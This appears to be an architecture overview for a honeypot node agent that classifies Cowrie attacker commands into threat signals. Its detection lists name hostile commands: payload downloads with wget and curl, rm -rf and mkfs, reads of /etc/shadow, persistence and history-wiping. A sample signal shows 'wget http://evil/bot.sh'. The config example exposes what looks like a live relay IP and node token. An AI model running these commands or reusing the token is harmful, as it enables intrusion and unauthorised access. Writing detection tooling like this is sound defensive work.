# DrishtiMesh Node Agent — Architecture Overview

## Overview

The DrishtiMesh Node Agent is the local intelligence processor that runs beside a honeypot sensor.

Its responsibility is to:

- Read local Cowrie logs
- Extract meaningful threat activity
- Convert events into normalized signals
- Send signals securely to the DrishtiMesh Relay
- Maintain node heartbeat status
- Avoid resending already processed events

The node-agent does NOT send raw honeypot telemetry.

Only normalized threat intelligence signals are transmitted.

---

# Core Principle

```text
Raw logs stay local
Only intelligence signals leave the node
```

This keeps:

- contributor privacy
- operational safety
- lightweight bandwidth usage
- distributed ownership model

---

# Current V1 Architecture

```text
Cowrie Honeypot
        │
        ▼
cowrie.json
        │
        ▼
DrishtiMesh Node Agent
        │
        ├── Parser
        ├── Event Classifier
        ├── Signal Generator
        ├── State Tracker
        ├── Sender
        └── Heartbeat Client
        │
        ▼
DrishtiMesh Relay API
```

---

# Current Directory Structure

```text
node-agent/
├── main.py
├── config.py
├── parser.py
├── classifier.py
├── sender.py
├── heartbeat.py
├── state.py
├── state.json
├── sample-cowrie.json
├── .env
├── requirements.txt
└── venv/
```

---

# Component Breakdown

## 1. config.py

Purpose:

```text
Load environment configuration
```

Loads:

```text
RELAY_URL
NODE_ID
NODE_TOKEN
SENSOR_TYPE
COWRIE_JSON_PATH
```

Example:

```env
RELAY_URL=http://139.84.172.22:8000
NODE_ID=66df6f35-d73a-4521-b5e7-5706823b30f7
NODE_TOKEN=QCAR3Dy1ccKA_DOStu2mufXfdr27w3eizOEW-GPALKw
SENSOR_TYPE=cowrie
COWRIE_JSON_PATH=./sample-cowrie.json
```

---

# 2. parser.py

Purpose:

```text
Read Cowrie JSON logs
Parse line-by-line events
Skip invalid JSON
```

Current capabilities:

- JSON line parsing
- incremental line tracking
- start-line offset support

---

# 3. classifier.py

Purpose:

```text
Convert Cowrie events into DrishtiMesh signals
```

Handles:

```text
cowrie.login.failed
cowrie.login.success
cowrie.command.input
cowrie.session.file_download
cowrie.session.file_upload
cowrie.direct-tcpip.request
```

---

# Command Classification Engine

## Current Detection Logic

### System Reconnaissance

Commands:

```text
uname
whoami
id
hostname
uptime
```

Produces:

```text
system_reconnaissance
```

---

### Network Reconnaissance

Commands:

```text
ifconfig
ip a
netstat
ss
route
```

Produces:

```text
network_reconnaissance
```

---

### Payload Download Attempt

Commands:

```text
wget
curl
tftp
ftpget
```

Produces:

```text
payload_download_attempt
```

---

### Permission Modification

Commands:

```text
chmod +x
chmod 777
chmod 755
```

Produces:

```text
permission_change
```

---

### Execution Attempt

Commands:

```text
./payload
sh payload
bash payload
```

Produces:

```text
execution_attempt
```

---

### Persistence Attempt

Commands:

```text
crontab
systemctl enable
authorized_keys
rc.local
```

Produces:

```text
persistence_attempt
```

---

### Sensitive File Access

Commands:

```text
/etc/passwd
/etc/shadow
```

Produces:

```text
sensitive_file_access
```

---

### Destructive Commands

Commands:

```text
rm -rf
dd if=
mkfs
```

Produces:

```text
destructive_command
```

---

### Evasion Activity

Commands:

```text
history -c
unset HISTFILE
HISTFILE=/dev/null
```

Produces:

```text
evasion_attempt
```

---

# Event-Based Signal Mapping

## Current Event Mappings

```text
cowrie.login.failed
→ ssh_bruteforce

cowrie.login.success
→ interactive_access

cowrie.session.file_download
→ payload_download_confirmed

cowrie.session.file_upload
→ payload_upload

cowrie.direct-tcpip.request
→ proxy_or_tunnel_attempt
```

---

# Signal Format

Generated signals follow:

```json
{
  "node_id": "uuid",
  "src_ip": "45.153.34.120",
  "sensor": "cowrie",
  "eventid": "cowrie.command.input",
  "signal_type": "payload_download_attempt",
  "severity": "high",
  "confidence": 90,
  "raw_command": "wget http://evil/bot.sh",
  "metadata": {
    "command_family": "payload_download",
    "matched_keyword": "wget"
  }
}
```

---

# 4. sender.py

Purpose:

```text
Transmit signals to DrishtiMesh Relay
```

Features:

- Bearer token authentication
- JSON signal submission
- HTTP error handling
- relay response validation

Endpoint used:

```http
POST /signals
```

Authentication:

```http
Authorization: Bearer NODE_TOKEN
```

---

# 5. heartbeat.py

Purpose:

```text
Maintain node online presence
```

Sends:

```text
node_id
status
agent version
```

Endpoint:

```http
POST /nodes/heartbeat
```

---

# 6. state.py

Purpose:

```text
Track already processed Cowrie log lines
```

This prevents:

```text
duplicate signal submissions
```

---

# state.json

Current format:

```json
{
  "last_line": 6
}
```

Workflow:

```text
Read last processed line
↓
Skip old log entries
↓
Only process new lines
↓
Update state.json
```

---

# 7. main.py

Purpose:

```text
Main orchestration entrypoint
```

Current flow:

```text
Load config
↓
Send heartbeat
↓
Read state
↓
Parse Cowrie logs
↓
Classify events
↓
Generate signals
↓
Send to relay
↓
Update state
```

---

# Current Execution Flow

```text
python3 main.py
        │
        ▼
Read sample-cowrie.json
        │
        ▼
Extract events
        │
        ▼
Generate normalized signals
        │
        ▼
POST /signals
        │
        ▼
Receive reputation response
        │
        ▼
Update state.json
```

---

# Current Capabilities

## Completed

```text
Cowrie JSON parsing
Event classification
Command classification
Signal generation
Secure relay communication
Bearer token auth
Heartbeat reporting
State tracking
Duplicate prevention
Live relay integration
```

---

# Current Limitations

## V1 Limitations

```text
No real-time log tailing
No daemon mode
No retry queue
No offline buffering
No batching
No compression
No async processing
No Docker packaging yet
```

---

# Next Major Phase

## Real-Time Tailing

Goal:

```text
Monitor active Cowrie logs continuously
```

Future pipeline:

```text
Cowrie writes new log line
↓
Node-agent detects instantly
↓
Classify signal
↓
Send to relay in near real-time
```

---

# Future Roadmap

## Planned Features

```text
Real-time file tailing
Daemon/service mode
systemd integration
Retry queue
Offline buffering
Signal batching
Docker container
One-click installer
Remote config sync
Sensor auto-registration
Threat campaign grouping
Geo enrichment
External intel enrichment
```

---

# Long-Term Vision

The DrishtiMesh Node Agent is designed as:

```text
A lightweight distributed intelligence processor
that converts raw honeypot activity
into normalized threat intelligence signals.
```

The architecture ensures:

```text
Local telemetry ownership
Low bandwidth usage
Community scalability
Privacy-preserving intelligence sharing
```

Only structured intelligence signals are shared with the DrishtiMesh network.
